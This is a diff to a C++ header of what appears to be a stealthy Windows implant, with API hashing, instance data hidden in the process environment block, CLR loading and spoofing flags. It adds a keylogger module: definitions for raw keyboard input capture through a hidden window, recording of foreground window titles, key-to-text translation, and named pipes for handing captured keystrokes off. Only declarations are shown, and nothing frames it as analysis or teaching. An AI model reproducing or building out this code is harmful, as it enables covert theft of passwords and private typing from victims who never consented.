@@ -19,10 +19,6 @@ typedef _Type         IType;
 typedef _MethodInfo   IMethodInfo;
 typedef BindingFlags  IBindingFlags;
 
-#define max(a,b)            (((a) > (b)) ? (a) : (b))
-#define ALIGN_UP(x, align) (((x) + ((align) - 1)) & ~((align) - 1))
-#define ALIGN_DOWN(x, align) ((x) & ~((align) - 1))
-
 #define PIPE_BUFFER_LENGTH  0x10000
 #define DECLAPI( x )       decltype( x ) * x
 #define G_INSTANCE         INSTANCE* Instance = (INSTANCE*)( NtCurrentPeb()->TelemetryCoverageHeader );
@@ -32,22 +28,35 @@ typedef BindingFlags  IBindingFlags;
 
 #define NtCurrentThreadID HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread )
 
-#if defined(_WIN64)
-    using IMAGE_THUNK = IMAGE_THUNK_DATA64;
-    #define IMAGE_SNAP_BY_ORDINAL_X IMAGE_SNAP_BY_ORDINAL64
-    #define IMAGE_ORDINAL_X IMAGE_ORDINAL64
-#else
-    using IMAGE_THUNK = IMAGE_THUNK_DATA32;
-    #define IMAGE_SNAP_BY_ORDINAL_X IMAGE_SNAP_BY_ORDINAL32
-    #define IMAGE_ORDINAL_X IMAGE_ORDINAL32
-#endif
-
-
 #define RSL_IMP( w, m ) { \
     for ( int i = 1; i < HashPlural<decltype( Instance->w, m )>(); i++ ) { \
         reinterpret_cast<UPTR*>( &w )[ i ] = LoadApi( m, reinterpret_cast<UPTR*>( &m )[ i ] ); \
     } \
 }
+
+
+// definitions for Keylogger
+#define KEYLOG_CLASS_NAME L"KeyloggerClass" //need to change later
+#define HID_USAGE_PAGE_GENERIC 0x01
+#define HID_USAGE_GENERIC_KEYBOARD 0x06
+#define KEYLOG_BUFFER_LEN 250
+
+auto DECLFN CALLBACK WndCallback(
+    _In_ HWND   Window,
+    _In_ UINT   Message,
+    _In_ WPARAM WParam,
+    _In_ LPARAM LParam
+)->LRESULT;
+
+auto DECLFN SafePipeWrite(
+    _In_ CONST VOID* Buffer,
+    _In_ DWORD      BytesToWrite
+) -> BOOL;
+
+auto DECLFN CreateAndWaitPipe() -> BOOL;
+
+VOID ProcessWindowTitle();
+VOID ProcessKey(UINT Key);
 
 EXTERN_C PVOID StartPtr();
 EXTERN_C PVOID EndPtr();
@@ -142,6 +151,8 @@ struct _INSTANCE {
     PVOID Start;
     UPTR  Size;
 
+    WCHAR g_TitleBuffer[KEYLOG_BUFFER_LEN + 1];
+
     struct {
         BOOL  IsSpoof;
         BOOL  KeepLoad;
@@ -190,15 +201,13 @@ struct _INSTANCE {
         DECLAPI( GetModuleHandleA );
         DECLAPI( LoadLibraryA );
 
-		DECLAPI( NtAllocateVirtualMemory );
         DECLAPI( NtProtectVirtualMemory );
 
         DECLAPI( RtlAllocateHeap );
         DECLAPI( RtlReAllocateHeap );
         DECLAPI( RtlFreeHeap );
-		DECLAPI( RtlAddFunctionTable );
 
-        DECLAPI( LdrGetProcedureAddress );
+        DECLAPI( CLRCreateInstance );
 
         DECLAPI( SafeArrayGetUBound );
         DECLAPI( SafeArrayGetLBound );
@@ -217,6 +226,10 @@ struct _INSTANCE {
         DECLAPI( AllocConsoleWithOptions );
         DECLAPI( FreeConsole );
         
+        DECLAPI( CreatePipe );
+        DECLAPI( CreateNamedPipeA );
+        DECLAPI( ConnectNamedPipe );
+        DECLAPI( DisconnectNamedPipe );
         DECLAPI( CreateFileA );
         DECLAPI( WriteFile );
         DECLAPI( ReadFile );
@@ -227,6 +240,7 @@ struct _INSTANCE {
         DECLAPI( NtGetContextThread );
         DECLAPI( NtContinue );
         DECLAPI( RtlCaptureContext );
+		DECLAPI( NtDelayExecution );
 
         DECLAPI( RtlAddVectoredExceptionHandler );
         DECLAPI( RtlRemoveVectoredExceptionHandler );
@@ -244,20 +258,32 @@ struct _INSTANCE {
         DECLAPI( RtlExitUserProcess );
         DECLAPI( RtlExitUserThread  );
 
+        DECLAPI(RegisterClassExW);
+        DECLAPI(CreateWindowExW);
+        DECLAPI(RegisterRawInputDevices);
+        DECLAPI(GetMessageW);
+		DECLAPI(PeekMessageW);
+		DECLAPI(PostMessageW);
+        DECLAPI(TranslateMessage);
+        DECLAPI(DispatchMessageW);
+        DECLAPI(PostQuitMessage);
+        DECLAPI(GetRawInputData);
         DECLAPI(HeapAlloc);
         DECLAPI(GetProcessHeap);
         DECLAPI(DefWindowProcW);
         DECLAPI(RtlSecureZeroMemory);
+        DECLAPI(GetForegroundWindow);
+        DECLAPI(GetWindowThreadProcessId);
+        DECLAPI(GetWindowTextW);
+        DECLAPI(GetKeyboardState);
+        DECLAPI(GetKeyState);
+        DECLAPI(ToUnicode);
+        DECLAPI(MapVirtualKeyW);
         DECLAPI(HeapFree);
-        DECLAPI(CloseHandle);
-		DECLAPI(CreateThread);
 
-		int(__cdecl* swprintfw)(wchar_t*, const wchar_t*, ...);
         int(__cdecl* swprintf)(wchar_t*, SIZE_T, const wchar_t*, ...);
         size_t(__cdecl* wcslen)(const wchar_t* wcs);
         int (__cdecl* wcsncmp)(const wchar_t* wcs1, const wchar_t* wcs2, size_t num);
-		int(__cdecl* lstrcpyW)(wchar_t* dest, const wchar_t* src);
-		int(__cdecl* strcmp)(const char* str1, const char* str2);
 
     } Win32;
 
